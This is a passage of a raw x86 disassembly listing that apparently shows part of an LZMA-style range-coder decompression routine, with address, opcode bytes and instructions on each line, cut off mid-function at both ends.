  406bce:	74 0c                	je     0x406bdc
  406bd0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406bd3:	4e                   	dec    %esi
  406bd4:	66 c7 04 70 00 04    	movw   $0x400,(%eax,%esi,2)
  406bda:	75 f4                	jne    0x406bd0
  406bdc:	83 65 b8 00          	andl   $0x0,-0x48(%ebp)
  406be0:	83 65 c0 00          	andl   $0x0,-0x40(%ebp)
  406be4:	eb 26                	jmp    0x406c0c
  406be6:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406bea:	0f 84 a6 08 00 00    	je     0x407496
  406bf0:	8b 45 b8             	mov    -0x48(%ebp),%eax
  406bf3:	ff 4d 94             	decl   -0x6c(%ebp)
  406bf6:	8b c8                	mov    %eax,%ecx
  406bf8:	8b 45 90             	mov    -0x70(%ebp),%eax
  406bfb:	c1 e1 03             	shl    $0x3,%ecx
  406bfe:	0f b6 00             	movzbl (%eax),%eax
  406c01:	d3 e0                	shl    %cl,%eax
  406c03:	09 45 c0             	or     %eax,-0x40(%ebp)
  406c06:	ff 45 90             	incl   -0x70(%ebp)
  406c09:	ff 45 b8             	incl   -0x48(%ebp)
  406c0c:	83 7d b8 04          	cmpl   $0x4,-0x48(%ebp)
  406c10:	7c d4                	jl     0x406be6
  406c12:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406c15:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  406c18:	74 28                	je     0x406c42
  406c1a:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  406c1e:	89 45 8c             	mov    %eax,-0x74(%ebp)
  406c21:	74 09                	je     0x406c2c
  406c23:	ff 75 f8             	push   -0x8(%ebp)
  406c26:	ff 15 0c 81 40 00    	call   *0x40810c
  406c2c:	ff 75 c0             	push   -0x40(%ebp)
  406c2f:	6a 40                	push   $0x40
  406c31:	ff 15 10 81 40 00    	call   *0x408110
  406c37:	85 c0                	test   %eax,%eax
  406c39:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406c3c:	0f 84 00 09 00 00    	je     0x407542
  406c42:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406c45:	8b 4d 8c             	mov    -0x74(%ebp),%ecx
  406c48:	c7 45 b8 05 00 00 00 	movl   $0x5,-0x48(%ebp)
  406c4f:	80 64 08 ff 00       	andb   $0x0,-0x1(%eax,%ecx,1)
  406c54:	eb 21                	jmp    0x406c77
  406c56:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406c5a:	0f 84 45 08 00 00    	je     0x4074a5
  406c60:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406c63:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406c66:	ff 4d 94             	decl   -0x6c(%ebp)
  406c69:	0f b6 09             	movzbl (%ecx),%ecx
  406c6c:	c1 e0 08             	shl    $0x8,%eax
  406c6f:	0b c1                	or     %ecx,%eax
  406c71:	ff 45 90             	incl   -0x70(%ebp)
  406c74:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406c77:	8b 45 b8             	mov    -0x48(%ebp),%eax
  406c7a:	ff 4d b8             	decl   -0x48(%ebp)
  406c7d:	85 c0                	test   %eax,%eax
  406c7f:	75 d5                	jne    0x406c56
  406c81:	8b 45 a0             	mov    -0x60(%ebp),%eax
  406c84:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406c87:	23 45 e4             	and    -0x1c(%ebp),%eax
  406c8a:	c7 85 7c ff ff ff 06 	movl   $0x6,-0x84(%ebp)
  406c91:	00 00 00 
  406c94:	c1 e1 04             	shl    $0x4,%ecx
  406c97:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  406c9a:	03 c8                	add    %eax,%ecx
  406c9c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406c9f:	8d 34 48             	lea    (%eax,%ecx,2),%esi
  406ca2:	e9 6c 06 00 00       	jmp    0x407313
  406ca7:	33 d2                	xor    %edx,%edx
  406ca9:	39 55 c0             	cmp    %edx,-0x40(%ebp)
  406cac:	75 6f                	jne    0x406d1d
  406cae:	0f b6 45 a4          	movzbl -0x5c(%ebp),%eax
  406cb2:	8b 75 a0             	mov    -0x60(%ebp),%esi
  406cb5:	b1 08                	mov    $0x8,%cl
  406cb7:	2a 4d c4             	sub    -0x3c(%ebp),%cl
  406cba:	23 75 e8             	and    -0x18(%ebp),%esi
  406cbd:	d3 e8                	shr    %cl,%eax
  406cbf:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  406cc2:	d3 e6                	shl    %cl,%esi
  406cc4:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406cc7:	03 c6                	add    %esi,%eax
  406cc9:	8d 04 40             	lea    (%eax,%eax,2),%eax
  406ccc:	c1 e0 09             	shl    $0x9,%eax
  406ccf:	83 7d c8 04          	cmpl   $0x4,-0x38(%ebp)
  406cd3:	8d 84 08 6c 0e 00 00 	lea    0xe6c(%eax,%ecx,1),%eax
  406cda:	89 45 a8             	mov    %eax,-0x58(%ebp)
  406cdd:	7d 05                	jge    0x406ce4
  406cdf:	89 55 c8             	mov    %edx,-0x38(%ebp)
  406ce2:	eb 10                	jmp    0x406cf4
  406ce4:	83 7d c8 0a          	cmpl   $0xa,-0x38(%ebp)
  406ce8:	7d 06                	jge    0x406cf0
  406cea:	83 6d c8 03          	subl   $0x3,-0x38(%ebp)
  406cee:	eb 04                	jmp    0x406cf4
  406cf0:	83 6d c8 06          	subl   $0x6,-0x38(%ebp)
  406cf4:	39 55 cc             	cmp    %edx,-0x34(%ebp)
  406cf7:	74 1c                	je     0x406d15
  406cf9:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406cfc:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  406cff:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  406d02:	72 03                	jb     0x406d07
  406d04:	03 45 8c             	add    -0x74(%ebp),%eax
  406d07:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  406d0a:	33 db                	xor    %ebx,%ebx
  406d0c:	43                   	inc    %ebx
  406d0d:	8a 04 08             	mov    (%eax,%ecx,1),%al
  406d10:	88 45 a5             	mov    %al,-0x5b(%ebp)
  406d13:	eb 68                	jmp    0x406d7d
  406d15:	33 db                	xor    %ebx,%ebx
  406d17:	43                   	inc    %ebx
  406d18:	e9 cd 01 00 00       	jmp    0x406eea
  406d1d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406d20:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406d23:	c7 45 cc 01 00 00 00 	movl   $0x1,-0x34(%ebp)
  406d2a:	c7 85 7c ff ff ff 07 	movl   $0x7,-0x84(%ebp)
  406d31:	00 00 00 
  406d34:	8d b4 48 80 01 00 00 	lea    0x180(%eax,%ecx,2),%esi
  406d3b:	e9 d3 05 00 00       	jmp    0x407313
  406d40:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406d44:	0f 84 67 07 00 00    	je     0x4074b1
  406d4a:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406d4d:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406d50:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406d54:	0f b6 09             	movzbl (%ecx),%ecx
  406d57:	ff 4d 94             	decl   -0x6c(%ebp)
  406d5a:	c1 e0 08             	shl    $0x8,%eax
  406d5d:	0b c1                	or     %ecx,%eax
  406d5f:	ff 45 90             	incl   -0x70(%ebp)
  406d62:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406d65:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406d68:	39 45 b8             	cmp    %eax,-0x48(%ebp)
  406d6b:	0f 85 ad 00 00 00    	jne    0x406e1e
  406d71:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  406d77:	0f 8d 05 01 00 00    	jge    0x406e82
  406d7d:	0f b6 45 a5          	movzbl -0x5b(%ebp),%eax
  406d81:	d0 65 a5             	shlb   $1,-0x5b(%ebp)
  406d84:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  406d87:	c1 e8 07             	shr    $0x7,%eax
  406d8a:	89 45 b8             	mov    %eax,-0x48(%ebp)
  406d8d:	40                   	inc    %eax
  406d8e:	c1 e0 08             	shl    $0x8,%eax
  406d91:	03 c3                	add    %ebx,%eax
  406d93:	8d 34 41             	lea    (%ecx,%eax,2),%esi
  406d96:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406d99:	c1 e9 0b             	shr    $0xb,%ecx
  406d9c:	66 8b 06             	mov    (%esi),%ax
  406d9f:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406da2:	0f b7 d0             	movzwl %ax,%edx
  406da5:	0f af ca             	imul   %edx,%ecx
  406da8:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  406dab:	73 1a                	jae    0x406dc7
  406dad:	83 65 c0 00          	andl   $0x0,-0x40(%ebp)
  406db1:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406db4:	b9 00 08 00 00       	mov    $0x800,%ecx
  406db9:	2b ca                	sub    %edx,%ecx
  406dbb:	c1 f9 05             	sar    $0x5,%ecx
  406dbe:	03 c8                	add    %eax,%ecx
  406dc0:	03 db                	add    %ebx,%ebx
  406dc2:	66 89 0e             	mov    %cx,(%esi)
  406dc5:	eb 1d                	jmp    0x406de4
  406dc7:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  406dca:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406dcd:	66 8b c8             	mov    %ax,%cx
  406dd0:	c7 45 c0 01 00 00 00 	movl   $0x1,-0x40(%ebp)
  406dd7:	66 c1 e9 05          	shr    $0x5,%cx
  406ddb:	2b c1                	sub    %ecx,%eax
  406ddd:	8d 5c 1b 01          	lea    0x1(%ebx,%ebx,1),%ebx
  406de1:	66 89 06             	mov    %ax,(%esi)
  406de4:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406deb:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406dee:	0f 83 71 ff ff ff    	jae    0x406d65
  406df4:	e9 47 ff ff ff       	jmp    0x406d40
  406df9:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406dfd:	0f 84 ba 06 00 00    	je     0x4074bd
  406e03:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406e06:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406e09:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406e0d:	0f b6 09             	movzbl (%ecx),%ecx
  406e10:	ff 4d 94             	decl   -0x6c(%ebp)
  406e13:	c1 e0 08             	shl    $0x8,%eax
  406e16:	0b c1                	or     %ecx,%eax
  406e18:	ff 45 90             	incl   -0x70(%ebp)
  406e1b:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406e1e:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  406e24:	7d 5c                	jge    0x406e82
  406e26:	8b 45 a8             	mov    -0x58(%ebp),%eax
  406e29:	8d 14 1b             	lea    (%ebx,%ebx,1),%edx
  406e2c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406e2f:	8d 34 02             	lea    (%edx,%eax,1),%esi
  406e32:	c1 e9 0b             	shr    $0xb,%ecx
  406e35:	66 8b 06             	mov    (%esi),%ax
  406e38:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406e3b:	0f b7 f8             	movzwl %ax,%edi
  406e3e:	0f af cf             	imul   %edi,%ecx
  406e41:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  406e44:	73 16                	jae    0x406e5c
  406e46:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406e49:	b9 00 08 00 00       	mov    $0x800,%ecx
  406e4e:	2b cf                	sub    %edi,%ecx
  406e50:	c1 f9 05             	sar    $0x5,%ecx
  406e53:	03 c8                	add    %eax,%ecx
  406e55:	03 db                	add    %ebx,%ebx
  406e57:	66 89 0e             	mov    %cx,(%esi)
  406e5a:	eb 15                	jmp    0x406e71
  406e5c:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  406e5f:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406e62:	66 8b c8             	mov    %ax,%cx
  406e65:	8d 5a 01             	lea    0x1(%edx),%ebx
  406e68:	66 c1 e9 05          	shr    $0x5,%cx
  406e6c:	2b c1                	sub    %ecx,%eax
  406e6e:	66 89 06             	mov    %ax,(%esi)
  406e71:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406e78:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406e7b:	73 a1                	jae    0x406e1e
  406e7d:	e9 77 ff ff ff       	jmp    0x406df9
  406e82:	83 65 cc 00          	andl   $0x0,-0x34(%ebp)
  406e86:	8a 45 bc             	mov    -0x44(%ebp),%al
  406e89:	88 45 a4             	mov    %al,-0x5c(%ebp)
  406e8c:	83 7d 9c 00          	cmpl   $0x0,-0x64(%ebp)
  406e90:	0f 84 3f 06 00 00    	je     0x4074d5
  406e96:	8b 4d 98             	mov    -0x68(%ebp),%ecx
  406e99:	8a 45 a4             	mov    -0x5c(%ebp),%al
  406e9c:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406e9f:	ff 45 a0             	incl   -0x60(%ebp)
  406ea2:	ff 45 98             	incl   -0x68(%ebp)
  406ea5:	ff 4d 9c             	decl   -0x64(%ebp)
  406ea8:	88 01                	mov    %al,(%ecx)
  406eaa:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  406ead:	88 04 11             	mov    %al,(%ecx,%edx,1)
  406eb0:	8d 41 01             	lea    0x1(%ecx),%eax
  406eb3:	33 d2                	xor    %edx,%edx
  406eb5:	f7 75 8c             	divl   -0x74(%ebp)
  406eb8:	e9 95 01 00 00       	jmp    0x407052
  406ebd:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406ec1:	0f 84 02 06 00 00    	je     0x4074c9
  406ec7:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406eca:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406ecd:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406ed1:	0f b6 09             	movzbl (%ecx),%ecx
  406ed4:	ff 4d 94             	decl   -0x6c(%ebp)
  406ed7:	c1 e0 08             	shl    $0x8,%eax
  406eda:	0b c1                	or     %ecx,%eax
  406edc:	ff 45 90             	incl   -0x70(%ebp)
  406edf:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406ee2:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  406ee8:	7d 9c                	jge    0x406e86
  406eea:	8b 45 a8             	mov    -0x58(%ebp),%eax
  406eed:	8d 14 1b             	lea    (%ebx,%ebx,1),%edx
  406ef0:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406ef3:	8d 34 02             	lea    (%edx,%eax,1),%esi
  406ef6:	c1 e9 0b             	shr    $0xb,%ecx
  406ef9:	66 8b 06             	mov    (%esi),%ax
  406efc:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406eff:	0f b7 f8             	movzwl %ax,%edi
  406f02:	0f af cf             	imul   %edi,%ecx
  406f05:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  406f08:	73 16                	jae    0x406f20
  406f0a:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406f0d:	b9 00 08 00 00       	mov    $0x800,%ecx
  406f12:	2b cf                	sub    %edi,%ecx
  406f14:	c1 f9 05             	sar    $0x5,%ecx
  406f17:	03 c8                	add    %eax,%ecx
  406f19:	03 db                	add    %ebx,%ebx
  406f1b:	66 89 0e             	mov    %cx,(%esi)
  406f1e:	eb 15                	jmp    0x406f35
  406f20:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  406f23:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406f26:	66 8b c8             	mov    %ax,%cx
  406f29:	8d 5a 01             	lea    0x1(%edx),%ebx
  406f2c:	66 c1 e9 05          	shr    $0x5,%cx
  406f30:	2b c1                	sub    %ecx,%eax
  406f32:	66 89 06             	mov    %ax,(%esi)
  406f35:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406f3c:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406f3f:	73 a1                	jae    0x406ee2
  406f41:	e9 77 ff ff ff       	jmp    0x406ebd
  406f46:	83 7d c0 01          	cmpl   $0x1,-0x40(%ebp)
  406f4a:	75 1c                	jne    0x406f68
  406f4c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406f4f:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406f52:	c7 85 7c ff ff ff 08 	movl   $0x8,-0x84(%ebp)
  406f59:	00 00 00 
  406f5c:	8d b4 48 98 01 00 00 	lea    0x198(%eax,%ecx,2),%esi
  406f63:	e9 ab 03 00 00       	jmp    0x407313
  406f68:	8b 45 dc             	mov    -0x24(%ebp),%eax
  406f6b:	c7 45 80 16 00 00 00 	movl   $0x16,-0x80(%ebp)
  406f72:	89 45 e0             	mov    %eax,-0x20(%ebp)
  406f75:	8b 45 d8             	mov    -0x28(%ebp),%eax
  406f78:	89 45 dc             	mov    %eax,-0x24(%ebp)
  406f7b:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  406f7e:	89 45 d8             	mov    %eax,-0x28(%ebp)
  406f81:	33 c0                	xor    %eax,%eax
  406f83:	83 7d c8 07          	cmpl   $0x7,-0x38(%ebp)
  406f87:	0f 9d c0             	setge  %al
  406f8a:	48                   	dec    %eax
  406f8b:	24 fd                	and    $0xfd,%al
  406f8d:	83 c0 0a             	add    $0xa,%eax
  406f90:	89 45 c8             	mov    %eax,-0x38(%ebp)
  406f93:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406f96:	05 64 06 00 00       	add    $0x664,%eax
  406f9b:	89 45 a8             	mov    %eax,-0x58(%ebp)
  406f9e:	8b 75 a8             	mov    -0x58(%ebp),%esi
  406fa1:	c7 85 7c ff ff ff 12 	movl   $0x12,-0x84(%ebp)
  406fa8:	00 00 00 
  406fab:	e9 63 03 00 00       	jmp    0x407313
  406fb0:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  406fb4:	75 21                	jne    0x406fd7
  406fb6:	8b 45 c8             	mov    -0x38(%ebp),%eax
  406fb9:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406fbc:	83 c0 0f             	add    $0xf,%eax
  406fbf:	c7 85 7c ff ff ff 09 	movl   $0x9,-0x84(%ebp)
  406fc6:	00 00 00 
  406fc9:	c1 e0 04             	shl    $0x4,%eax
  406fcc:	03 45 b4             	add    -0x4c(%ebp),%eax
  406fcf:	8d 34 41             	lea    (%ecx,%eax,2),%esi
  406fd2:	e9 3c 03 00 00       	jmp    0x407313
  406fd7:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406fda:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406fdd:	c7 85 7c ff ff ff 0a 	movl   $0xa,-0x84(%ebp)
  406fe4:	00 00 00 
  406fe7:	8d b4 48 b0 01 00 00 	lea    0x1b0(%eax,%ecx,2),%esi
  406fee:	e9 20 03 00 00       	jmp    0x407313
  406ff3:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  406ff7:	0f 85 b1 00 00 00    	jne    0x4070ae
  406ffd:	83 7d a0 00          	cmpl   $0x0,-0x60(%ebp)
  407001:	0f 84 3b 05 00 00    	je     0x407542
  407007:	33 c0                	xor    %eax,%eax
  407009:	83 7d c8 07          	cmpl   $0x7,-0x38(%ebp)
  40700d:	0f 9d c0             	setge  %al
  407010:	8d 44 00 09          	lea    0x9(%eax,%eax,1),%eax
  407014:	89 45 c8             	mov    %eax,-0x38(%ebp)
  407017:	83 7d 9c 00          	cmpl   $0x0,-0x64(%ebp)
  40701b:	0f 84 c0 04 00 00    	je     0x4074e1
  407021:	8b 45 ec             	mov    -0x14(%ebp),%eax
  407024:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  407027:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  40702a:	72 03                	jb     0x40702f
  40702c:	03 45 8c             	add    -0x74(%ebp),%eax
  40702f:	8b 55 f8             	mov    -0x8(%ebp),%edx
  407032:	8a 0c 10             	mov    (%eax,%edx,1),%cl
  407035:	8b 45 ec             	mov    -0x14(%ebp),%eax
  407038:	88 4d a4             	mov    %cl,-0x5c(%ebp)
  40703b:	88 0c 10             	mov    %cl,(%eax,%edx,1)
  40703e:	40                   	inc    %eax
  40703f:	33 d2                	xor    %edx,%edx
  407041:	f7 75 8c             	divl   -0x74(%ebp)
  407044:	8b 45 98             	mov    -0x68(%ebp),%eax
  407047:	ff 45 a0             	incl   -0x60(%ebp)
  40704a:	ff 45 98             	incl   -0x68(%ebp)
  40704d:	ff 4d 9c             	decl   -0x64(%ebp)
  407050:	88 08                	mov    %cl,(%eax)
  407052:	89 55 ec             	mov    %edx,-0x14(%ebp)
  407055:	c7 85 78 ff ff ff 02 	movl   $0x2,-0x88(%ebp)
  40705c:	00 00 00 
  40705f:	e9 c7 fa ff ff       	jmp    0x406b2b
  407064:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  407068:	75 05                	jne    0x40706f
  40706a:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40706d:	eb 36                	jmp    0x4070a5
  40706f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407072:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  407075:	c7 85 7c ff ff ff 0b 	movl   $0xb,-0x84(%ebp)
  40707c:	00 00 00 
  40707f:	8d b4 48 c8 01 00 00 	lea    0x1c8(%eax,%ecx,2),%esi
  407086:	e9 88 02 00 00       	jmp    0x407313
  40708b:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  40708f:	75 05                	jne    0x407096
  407091:	8b 45 dc             	mov    -0x24(%ebp),%eax
  407094:	eb 09                	jmp    0x40709f
  407096:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  407099:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40709c:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  40709f:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  4070a2:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  4070a5:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  4070a8:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4070ab:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  4070ae:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4070b1:	c7 45 80 15 00 00 00 	movl   $0x15,-0x80(%ebp)
  4070b8:	05 68 0a 00 00       	add    $0xa68,%eax
  4070bd:	89 45 a8             	mov    %eax,-0x58(%ebp)
  4070c0:	e9 d9 fe ff ff       	jmp    0x406f9e
  4070c5:	33 c0                	xor    %eax,%eax
  4070c7:	83 7d c8 07          	cmpl   $0x7,-0x38(%ebp)
  4070cb:	0f 9d c0             	setge  %al
  4070ce:	48                   	dec    %eax
  4070cf:	24 fd                	and    $0xfd,%al
  4070d1:	83 c0 0b             	add    $0xb,%eax
  4070d4:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4070d7:	e9 9a 01 00 00       	jmp    0x407276
  4070dc:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4070df:	83 f8 04             	cmp    $0x4,%eax
  4070e2:	7c 03                	jl     0x4070e7
  4070e4:	6a 03                	push   $0x3
  4070e6:	58                   	pop    %eax
  4070e7:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4070ea:	c7 45 c0 06 00 00 00 	movl   $0x6,-0x40(%ebp)
  4070f1:	c1 e0 07             	shl    $0x7,%eax
  4070f4:	c7 45 84 19 00 00 00 	movl   $0x19,-0x7c(%ebp)
  4070fb:	8d 84 08 60 03 00 00 	lea    0x360(%eax,%ecx,1),%eax
  407102:	89 45 a8             	mov    %eax,-0x58(%ebp)
  407105:	e9 ce 02 00 00       	jmp    0x4073d8
  40710a:	83 fb 04             	cmp    $0x4,%ebx
  40710d:	7c 34                	jl     0x407143
  40710f:	8b cb                	mov    %ebx,%ecx
  407111:	8b c3                	mov    %ebx,%eax
  407113:	d1 f9                	sar    $1,%ecx
  407115:	83 e0 01             	and    $0x1,%eax
  407118:	49                   	dec    %ecx
  407119:	0c 02                	or     $0x2,%al
  40711b:	d3 e0                	shl    %cl,%eax
  40711d:	83 fb 0e             	cmp    $0xe,%ebx
  407120:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  407123:	7d 14                	jge    0x407139
  407125:	8b 55 fc             	mov    -0x4(%ebp),%edx
  407128:	2b c3                	sub    %ebx,%eax
  40712a:	89 4d c0             	mov    %ecx,-0x40(%ebp)
  40712d:	8d 84 42 5e 05 00 00 	lea    0x55e(%edx,%eax,2),%eax
  407134:	e9 81 00 00 00       	jmp    0x4071ba
  407139:	33 db                	xor    %ebx,%ebx
  40713b:	83 c1 fc             	add    $0xfffffffc,%ecx
  40713e:	89 4d b8             	mov    %ecx,-0x48(%ebp)
  407141:	eb 33                	jmp    0x407176
  407143:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  407146:	e9 28 01 00 00       	jmp    0x407273
  40714b:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  40714f:	0f 84 98 03 00 00    	je     0x4074ed
  407155:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  407158:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40715b:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  40715f:	0f b6 09             	movzbl (%ecx),%ecx
  407162:	ff 4d 94             	decl   -0x6c(%ebp)
  407165:	c1 e0 08             	shl    $0x8,%eax
  407168:	0b c1                	or     %ecx,%eax
  40716a:	ff 45 90             	incl   -0x70(%ebp)
  40716d:	89 45 f4             	mov    %eax,-0xc(%ebp)
  407170:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  407173:	ff 4d b8             	decl   -0x48(%ebp)
  407176:	83 7d b8 00          	cmpl   $0x0,-0x48(%ebp)
  40717a:	7e 27                	jle    0x4071a3
  40717c:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40717f:	03 db                	add    %ebx,%ebx
  407181:	d1 6d f0             	shrl   $1,-0x10(%ebp)
  407184:	3b 4d f0             	cmp    -0x10(%ebp),%ecx
  407187:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  40718a:	72 0c                	jb     0x407198
  40718c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40718f:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  407192:	83 cb 01             	or     $0x1,%ebx
  407195:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  407198:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  40719f:	73 d2                	jae    0x407173
  4071a1:	eb a8                	jmp    0x40714b
  4071a3:	c1 e3 04             	shl    $0x4,%ebx
  4071a6:	03 c3                	add    %ebx,%eax
  4071a8:	c7 45 c0 04 00 00 00 	movl   $0x4,-0x40(%ebp)
  4071af:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4071b2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4071b5:	05 44 06 00 00       	add    $0x644,%eax
  4071ba:	33 db                	xor    %ebx,%ebx
  4071bc:	89 45 a8             	mov    %eax,-0x58(%ebp)
  4071bf:	c7 45 b0 01 00 00 00 	movl   $0x1,-0x50(%ebp)
  4071c6:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  4071c9:	89 5d b8             	mov    %ebx,-0x48(%ebp)
  4071cc:	eb 28                	jmp    0x4071f6
  4071ce:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  4071d2:	0f 84 21 03 00 00    	je     0x4074f9
  4071d8:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  4071db:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4071de:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  4071e2:	0f b6 09             	movzbl (%ecx),%ecx
  4071e5:	ff 4d 94             	decl   -0x6c(%ebp)
  4071e8:	c1 e0 08             	shl    $0x8,%eax
  4071eb:	0b c1                	or     %ecx,%eax
  4071ed:	ff 45 90             	incl   -0x70(%ebp)
  4071f0:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4071f3:	ff 45 b8             	incl   -0x48(%ebp)
  4071f6:	8b 45 c0             	mov    -0x40(%ebp),%eax
  4071f9:	39 45 b8             	cmp    %eax,-0x48(%ebp)
  4071fc:	7d 72                	jge    0x407270
  4071fe:	8b 45 b0             	mov    -0x50(%ebp),%eax
  407201:	8b 55 f0             	mov    -0x10(%ebp),%edx
  407204:	c1 ea 0b             	shr    $0xb,%edx
  407207:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  40720a:	8b 45 a8             	mov    -0x58(%ebp),%eax
  40720d:	8d 34 07             	lea    (%edi,%eax,1),%esi
  407210:	89 75 ac             	mov    %esi,-0x54(%ebp)
  407213:	66 8b 06             	mov    (%esi),%ax
  407216:	0f b7 c8             	movzwl %ax,%ecx
  407219:	0f af d1             	imul   %ecx,%edx
  40721c:	39 55 f4             	cmp    %edx,-0xc(%ebp)
  40721f:	73 17                	jae    0x407238
  407221:	89 55 f0             	mov    %edx,-0x10(%ebp)
  407224:	ba 00 08 00 00       	mov    $0x800,%edx
  407229:	2b d1                	sub    %ecx,%edx
  40722b:	c1 fa 05             	sar    $0x5,%edx
  40722e:	03 d0                	add    %eax,%edx
  407230:	d1 65 b0             	shll   $1,-0x50(%ebp)
  407233:	66 89 16             	mov    %dx,(%esi)
  407236:	eb 2a                	jmp    0x407262
  407238:	33 c9                	xor    %ecx,%ecx
  40723a:	29 55 f0             	sub    %edx,-0x10(%ebp)
  40723d:	41                   	inc    %ecx
  40723e:	29 55 f4             	sub    %edx,-0xc(%ebp)
  407241:	8b d9                	mov    %ecx,%ebx
